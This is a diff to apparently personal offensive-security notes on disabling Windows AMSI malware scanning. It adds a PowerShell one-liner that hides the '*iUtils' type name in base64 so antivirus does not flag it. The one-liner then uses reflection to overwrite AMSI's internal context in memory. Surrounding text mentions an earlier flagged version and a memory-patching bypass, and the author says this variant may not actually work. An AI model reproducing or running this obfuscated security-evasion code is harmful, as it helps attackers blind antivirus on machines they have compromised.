@@ -23,6 +23,12 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like ("*i" + "Utils
 ```
 <br><br>
 
+**Above is flagged by AV.  This is not but this also doesnt block anything AMSI for me....**
+
+``` powershell
+$find = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("KgBpAFUAdABpAGwAcwA=")); $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like $find) {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+```
+
 ### Disable AMSI by patching internals (This attack only seems to work for me when pasting into powershell.  Not loading a ps1 file 
 
 **After performing this attack make sure to reset the memory back to its old read/execute permissions**
